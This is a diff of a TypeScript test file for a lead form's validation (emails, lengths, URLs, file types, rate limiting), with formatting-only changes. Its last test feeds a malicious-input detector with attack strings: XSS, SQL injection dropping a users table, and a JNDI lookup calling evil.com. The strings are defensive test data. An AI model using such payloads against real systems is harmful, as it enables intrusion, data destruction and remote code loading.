@@ -16,10 +16,7 @@ describe("Lead Form Validation Logic", () => {
 
     const validateCategories = (categories: string[]): boolean => {
       const validCategories = ["O-1", "EB-1A", "EB-2 NIW", "I don't know"];
-      return (
-        categories.length > 0 &&
-        categories.every((cat) => validCategories.includes(cat))
-      );
+      return categories.length > 0 && categories.every((cat) => validCategories.includes(cat));
     };
 
     it("should validate email formats correctly", () => {
@@ -64,11 +61,7 @@ describe("Lead Form Validation Logic", () => {
   });
 
   describe("Field Length Validation", () => {
-    const validateFieldLength = (
-      value: string,
-      min: number,
-      max: number
-    ): boolean => {
+    const validateFieldLength = (value: string, min: number, max: number): boolean => {
       const trimmed = value.trim();
       return trimmed.length >= min && trimmed.length <= max;
     };
@@ -83,12 +76,8 @@ describe("Lead Form Validation Logic", () => {
     it("should validate email length", () => {
       expect(validateFieldLength("j@d.co", 5, 100)).toBe(true);
       expect(validateFieldLength("j@d", 5, 100)).toBe(false);
-      expect(validateFieldLength("a".repeat(90) + "@test.com", 5, 100)).toBe(
-        true
-      );
-      expect(validateFieldLength("a".repeat(100) + "@test.com", 5, 100)).toBe(
-        false
-      );
+      expect(validateFieldLength("a".repeat(90) + "@test.com", 5, 100)).toBe(true);
+      expect(validateFieldLength("a".repeat(100) + "@test.com", 5, 100)).toBe(false);
     });
 
     it("should validate reason length", () => {
@@ -101,7 +90,9 @@ describe("Lead Form Validation Logic", () => {
 
   describe("URL Validation", () => {
     const validateURL = (url: string): boolean => {
-      if (!url || url.trim().length === 0) return true; // Optional field
+      if (!url || url.trim().length === 0) {
+        return true;
+      } // Optional field
 
       const urlPattern = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;
       const simplePattern =
@@ -146,9 +137,7 @@ describe("Lead Form Validation Logic", () => {
       expect(validateFileType("application/pdf")).toBe(true);
       expect(validateFileType("application/msword")).toBe(true);
       expect(
-        validateFileType(
-          "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
-        )
+        validateFileType("application/vnd.openxmlformats-officedocument.wordprocessingml.document")
       ).toBe(true);
       expect(validateFileType("text/plain")).toBe(true);
 
@@ -182,9 +171,7 @@ describe("Lead Form Validation Logic", () => {
           const userRequests = requests.get(ip) || [];
 
           // Remove old requests outside the window
-          const recentRequests = userRequests.filter(
-            (time: number) => now - time < WINDOW_MS
-          );
+          const recentRequests = userRequests.filter((time: number) => now - time < WINDOW_MS);
 
           if (recentRequests.length >= MAX_REQUESTS) {
             return false;
@@ -197,7 +184,9 @@ describe("Lead Form Validation Logic", () => {
 
         getResetTime: (ip: string, now: number = Date.now()): number => {
           const userRequests = requests.get(ip) || [];
-          if (userRequests.length === 0) return now;
+          if (userRequests.length === 0) {
+            return now;
+          }
           return userRequests[0] + WINDOW_MS;
         },
       };
@@ -300,26 +289,20 @@ describe("Lead Form Validation Logic", () => {
 
     it("should detect malicious input patterns", () => {
       // Should detect XSS attempts
-      expect(containsMaliciousPattern('<script>alert("xss")</script>')).toBe(
-        true
-      );
+      expect(containsMaliciousPattern('<script>alert("xss")</script>')).toBe(true);
       expect(containsMaliciousPattern("javascript:alert(1)")).toBe(true);
       expect(containsMaliciousPattern('onclick="evil()"')).toBe(true);
 
       // Should detect SQL injection attempts
       expect(containsMaliciousPattern("'; DROP TABLE users; --")).toBe(true);
-      expect(containsMaliciousPattern("UNION SELECT * FROM passwords")).toBe(
-        true
-      );
+      expect(containsMaliciousPattern("UNION SELECT * FROM passwords")).toBe(true);
 
       // Should detect LDAP injection
       expect(containsMaliciousPattern("${jndi:ldap://evil.com/a}")).toBe(true);
 
       // Should allow normal input
       expect(containsMaliciousPattern("John Doe")).toBe(false);
-      expect(containsMaliciousPattern("I need help with my application")).toBe(
-        false
-      );
+      expect(containsMaliciousPattern("I need help with my application")).toBe(false);
     });
   });
 });
